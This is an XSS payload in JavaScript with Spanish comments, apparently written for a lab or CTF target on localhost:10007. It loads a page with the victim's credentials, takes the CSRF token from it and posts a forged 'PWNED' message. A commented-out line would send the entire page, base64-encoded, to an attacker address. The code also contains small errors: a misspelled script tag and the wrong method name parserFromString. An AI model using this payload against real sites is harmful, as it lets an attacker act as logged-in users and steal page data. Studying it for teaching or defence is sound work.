<scritp>
  // Enviar post y guardar la información 
  //
    
  var domain = "http://localhost:10007//newgossip";
  var req1 = new XMLHttpRequest();
  req1.withCredentials= true; //Para que no se modifiquen los valores que son de credenciales
  req1.open('GET',domain,false); // el false es para que sea petición sincrona en vez de asincrona 
  req1.send();

  var response = req1.responseText;
  //var req2 = new XMLHttpRequest();
  //A partir de aquí podemos obtener el csrf_token, aplicando a la inversa la base64
  //req2.open('GET', 'http://ip/?response=' + btoa(response)); //btoa convierte en base 64 todo el html

  //req2.send();
//
  
  var parser = new DOMParser();
  var doc = parser.parserFromString(response,'text/html');
  var token = doc.getElementsByName("_csrf_token")[0].value;

  var req2 = new XMLHttpRequest();
  var data = "title=PWNED&subtitle=PWNED&text=prueba&_csrf_token=" + token;
  req2.open('POST',"http://localhost:10007/newgossip",false);
  req2.withCredentials = true;
  req2.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
  req2.send(data);
</script>

